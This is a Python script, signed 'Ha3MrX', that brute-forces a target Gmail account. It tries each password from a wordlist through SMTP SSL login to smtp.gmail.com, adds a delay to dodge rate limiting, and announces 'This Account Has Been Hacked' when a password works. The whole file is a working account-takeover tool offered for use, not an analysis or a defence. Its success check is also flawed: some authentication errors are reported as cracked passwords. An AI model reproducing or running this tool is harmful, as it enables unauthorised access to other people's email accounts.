#!/usr/bin/python3
'''create by Ha3MrX'''

import smtplib
from os import system
import time

def main():
    print('=================================================')
    print('               create by Ha3MrX                  ')
    print('=================================================')
    print('               ++++++++++++++++++++              ')
    print('\n                                               ')
    print('  _,.                                            ')
    print('                                                 ')
    print('                                                 ')
    print('           HA3MrX                                ')
    print('       _,.                   ')
    print('     ,` -.)                  ')
    print('    ( _/-\\-._               ')
    print('   /,|`--._,-^|            , ')
    print('   \_| |`-._/||          , | ')
    print('     |  `-, / |         /  / ')
    print('     |     || |        /  /  ')
    print('      `r-._||/   __   /  /   ')
    print('  __,-<_     )`-/  `./  /    ')
    print('  \   `---    \   / /  /     ')
    print('     |           |./  /      ')
    print('     /           //  /       ')
    print(' \_/  \         |/  /        ')
    print('  |    |   _,^- /  /         ')
    print('  |    , ``  (\/  /_         ')
    print('   \,.->._    \X-=/^         ')
    print('   (  /   `-._//^`           ')
    print('    `Y-.____(__}             ')
    print('     |     {__)              ')
    print('           ()   V.1.0        ')

main()
print('[1] start the attack')
print('[2] exit')
option = input('==>')
if option == '1':
    file_path = input('path of passwords file :')
else:
    system('clear')
    exit()

try:
    with open(file_path, 'r') as pass_file:
        pass_list = pass_file.readlines()
except FileNotFoundError:
    print("Password file not found.")
    exit()

def login():
    i = 0
    user_name = input('target email :')
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
    except Exception as e:
        print(f"Failed to connect to the server: {e}")
        return

    for password in pass_list:
        i += 1
        print(f"{i}/{len(pass_list)}")
        try:
            server.login(user_name, password.strip())
            system('clear')
            main()
            print('\n')
            print(f'[+] This Account Has Been Hacked Password: {password.strip()}     ^_^')
            break
        except smtplib.SMTPAuthenticationError as e:
            error = str(e)
            if '<' in error:
                system('clear')
                main()
                print(f'[+] This account has been hacked, password: {password.strip()}     ^_^')
                break
            else:
                print(f'[!] Password not found => {password.strip()}')
        except Exception as e:
            print(f"An error occurred: {e}")
            break
        time.sleep(1)  # Add a delay to avoid rate limiting

login()
